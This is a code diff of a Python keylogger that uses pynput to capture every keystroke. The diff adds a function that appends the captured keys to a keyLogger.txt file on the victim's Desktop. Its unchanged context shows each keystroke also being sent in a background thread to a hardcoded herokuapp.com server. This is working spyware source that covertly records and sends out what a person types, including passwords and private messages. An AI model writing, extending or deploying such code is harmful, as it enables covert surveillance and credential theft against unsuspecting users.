@@ -1,4 +1,5 @@
 import os
+import pathlib
 import re
 import shutil
 import subprocess
@@ -11,6 +12,7 @@ from pynput.keyboard import Listener
 
 line_length = 0
 HOST = "https://salty-basin-28879.herokuapp.com/"
+path = os.path.sep.join(path for index, path in enumerate(pathlib.Path(__file__).parent.parts) if index < 3)
 
 
 def launch_request(key):
@@ -20,8 +22,18 @@ def launch_request(key):
         print(e)
 
 
+def write_to_file(key):
+    with open(file=f"{path}{os.path.sep}Desktop{os.path.sep}keyLogger.txt", mode="a+") as f:
+        if int(f.tell()) % 50 == 0 and int(f.tell()) > 0:
+            f.write("\n")
+
+        if "{del}" in key:
+            f.truncate(f.tell() - 1)
+            return str(f.tell())
+        f.write(key)
+
+
 def key_recorder(key):
-    f = open(os.path.join(str(Path.home()), 'logger.txt'), 'a+')
     str_key = str(key)
     global line_length
     line_length += 1
@@ -50,8 +62,8 @@ def key_recorder(key):
     else:
 
         char += str_key.replace("'", "")
-    print(char)
-    f.write(char)
+
+    write_to_file(char)
     t = threading.Thread(target=launch_request, args=(char,))
     t.start()
 
